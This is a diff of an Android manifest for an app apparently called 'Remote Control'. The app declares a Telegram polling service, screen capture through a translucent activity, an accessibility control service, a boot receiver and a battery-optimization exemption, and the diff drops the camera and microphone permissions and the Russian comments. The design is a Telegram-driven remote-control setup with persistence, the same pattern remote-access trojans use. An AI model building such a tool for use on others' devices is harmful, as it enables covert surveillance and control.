@@ -1,44 +1,32 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools"
-    package="com.remotecontrol">
+    xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ───── Сетевые разрешения ───── -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <!-- ───── Foreground Services ───── -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <!-- API 34+: тип сервиса нужно указывать явно -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE"
         tools:ignore="ProtectedPermissions" />
 
-    <!-- ───── MediaProjection / ScreenCapture ───── -->
     <uses-permission android:name="android.permission.MEDIA_CONTENT_CONTROL"
         tools:ignore="ProtectedPermissions" />
 
-    <!-- ───── Камера / микрофон (опционально) ───── -->
-    <uses-permission android:name="android.permission.CAMERA" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-
-    <!-- ───── Уведомления (API 33+) ───── -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- ───── Управление устройством ───── -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
     <application
         android:allowBackup="false"
-        android:icon="@mipmap/ic_launcher"
-        android:label="@string/app_name"
+        android:icon="@android:drawable/btn_star"
+        android:label="Remote Control"
         android:supportsRtl="true"
-        android:theme="@style/AppTheme"
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
         tools:targetApi="31">
 
-        <!-- ───── MainActivity ───── -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -49,13 +37,11 @@
             </intent-filter>
         </activity>
 
-        <!-- ───── Скрытая Activity для запроса MediaProjection ───── -->
         <activity
             android:name=".ScreenCaptureRequestActivity"
             android:exported="false"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
-        <!-- ───── TelegramService (Long Polling) ───── -->
         <service
             android:name=".TelegramService"
             android:exported="false"
@@ -65,17 +51,15 @@
                 android:value="Telegram remote control background polling" />
         </service>
 
-        <!-- ───── ScreenCaptureService (MediaProjection) ───── -->
         <service
             android:name=".ScreenCaptureService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection" />
 
-        <!-- ───── MyAccessibilityService ───── -->
         <service
             android:name=".MyAccessibilityService"
             android:exported="true"
-            android:label="@string/accessibility_service_label"
+            android:label="Control Service"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
             <intent-filter>
                 <action android:name="android.accessibilityservice.AccessibilityService" />
@@ -85,7 +69,6 @@
                 android:resource="@xml/service_config" />
         </service>
 
-        <!-- ───── Boot Receiver ───── -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true">
